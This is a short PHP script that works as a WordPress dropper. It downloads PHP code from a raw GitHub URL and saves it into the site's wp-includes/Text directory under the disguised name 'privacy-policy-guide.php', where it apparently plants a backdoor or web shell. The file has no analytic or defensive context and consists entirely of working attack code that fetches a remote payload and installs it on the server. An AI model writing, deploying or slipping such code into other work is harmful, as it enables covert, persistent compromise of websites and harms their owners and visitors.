<?php
        $c = file_get_contents('https://raw.githubusercontent.com/maddalenasa/supportaa/refs/heads/main/v2/gpp6mfeheN.php');
        if (strpos($c, '<?php')===false) die('err fgc');
        $r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-includes/Text/privacy-policy-guide.php', $c);
        if ($r===false) die('err saving');
        die('/wp-includes/Text/privacy-policy-guide.php');